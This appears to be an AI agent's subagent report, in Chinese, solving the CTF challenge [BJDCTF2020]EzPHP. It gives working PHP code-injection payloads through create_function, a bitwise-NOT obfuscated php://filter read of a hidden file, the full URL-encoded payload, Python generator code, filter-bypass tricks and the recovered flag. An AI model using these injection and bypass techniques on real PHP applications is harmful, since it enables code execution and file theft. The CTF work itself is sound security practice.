## Branch Result
direction: dynamic_callable
subagent_id: branch_002
status: FEASIBLE

### 发现
- 这是经典 `[BJDCTF2020]EzPHP`。PHP 7.3.13 仍提供 `create_function(string $args, string $code)`，且其第二参数内部经 `eval` 处理。
- 精确 callable 为 `create_function`。它含下划线，因此不匹配 `$code` 的 `/^[a-z0-9]*$/isD`，可以进入 `$code('', $arg)`。
- 精确首阶段注入体为：
  ```
  }var_dump(get_defined_vars());//
  ```
  `}` 闭合 `create_function` 生成的函数体，`var_dump(get_defined_vars())` 在创建阶段执行，`//` 注释掉内部追加的右花括号。该字符串不命中 `$arg` 黑名单（注意只用了 `}`，黑名单禁 `{` 但未禁 `}`）。
- 实际目标首阶段输出确认注入代码可看到调用点变量，并泄露：
  ```
  ["ffffffff11111114ggggg"]=>
  string(89) "Baka, do you think it's so easy to get my flag? I hid the real flag in rea1fl4g.php 23333"
  ```
- 精确二阶段注入体为：
  ```
  }require(~<NOT("php://filter/read=convert.base64-encode/resource=rea1fl4g.php")>);//
  ```
  `require` 未在 `$arg` 黑名单中。被逐字节取反后的高位字节不含被禁明文；PHP 对该裸 token 做 `~` 后恢复 wrapper 字符串。
- 二阶段 `$arg` 的完整 URL 编码值：
  ```
  %7D%72%65%71%75%69%72%65%28%7E%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F%29%3B%2F%2F
  ```
- 所有 GET 参数名和值必须逐字节 `%XX` 编码，只有 `&` 和 `=` 分隔符保持原样。必须发送同名 POST 数组，使 `$_REQUEST` 中每个顶层值都是数组：
  ```
  file%5B%5D=0&debu%5B%5D=0&shana%5B%5D=0&passwd%5B%5D=0&flag%5B%5D=0
  ```
- 不应直接用 Python `requests` 发送已编码 URL：实测它会把 unreserved 字符的 `%XX` 规范化回明文，导致 `QUERY_STRING` 命中 `debu` 等关键词。使用 `http.client`、保留原始 request-target 的 curl，或其他不规范化路径的客户端。
- 实际目标输出的 Base64 解码为：
  ```php
  <?php
      echo "咦，你居然找到我了？！不过看到这句话也不代表你就能拿到flag哦！";
      $f4ke_flag = "BJD{1am_a_fake_f41111g23333}";
      $rea1_f1114g = "CTF2{e4785e7f-6bf1-46b5-9fd2-ce170bfdf870}";
      unset($rea1_f1114g);
  ```
- 实际 flag：
  ```
  CTF2{e4785e7f-6bf1-46b5-9fd2-ce170bfdf870}
  ```

### 命令和结果
- 首阶段 payload 生成逻辑：
  ```python
  def enc_bytes(b):
      return ''.join('%%%02X' % x for x in b)

  pairs = [
      (b'file', b'data://text/plain,debu_debu_aqua'),
      (b'debu', b'aqua_is_cute\n'),
      (b'shana[]', b'1'),
      (b'passwd[]', b'2'),
      (b'flag[code]', b'create_function'),
      (b'flag[arg]', b'}var_dump(get_defined_vars());//'),
  ]
  qs = '&'.join(f'{enc_bytes(k)}={enc_bytes(v)}' for k, v in pairs)
  ```
  目标响应关键结果：
  ```
  HTTP 200
  You seem: False
  I hate English: False
  Neeeeee! Good Job: True
  Very good: True
  rea1fl4g: True
  ```
- 二阶段 payload 生成逻辑：
  ```python
  resource = b'php://filter/read=convert.base64-encode/resource=rea1fl4g.php'
  neg = bytes((~x) & 0xff for x in resource)
  arg = b'}require(~' + neg + b');//'
  ```
  目标响应关键结果：
  ```
  HTTP 200
  You seem: False
  I hate English: False
  Neeeeee! Good Job: True
  Very good: True
  disabled all: False
  Parse error: False
  Fatal error: False
  base64_blob_len: 324
  decoded flag: CTF2{e4785e7f-6bf1-46b5-9fd2-ce170bfdf870}
  ```
- 参考资料：
  - PHP 官方手册 `create_function`：PHP 7 可用，内部执行 eval，PHP 7.2 起 deprecated、PHP 8 移除。
  - 同题 writeup `[BJDCTF2020]EzPHP`：确认 `}var_dump(get_defined_vars());//` 与逐字节取反 filter wrapper 路线。

### 结论
可行。`create_function` 是 PHP 7.3.13 下满足 `$code` 正则约束的精确 callable；首阶段 `}var_dump(get_defined_vars());//` 已在目标泄露真 flag 文件，二阶段 `}require(~<取反 wrapper>);//` 已在目标读取其源码并获得真实 flag。建议主线直接复用上述 `http.client` 原始 request-target 构造，避免 `requests` URL 规范化。
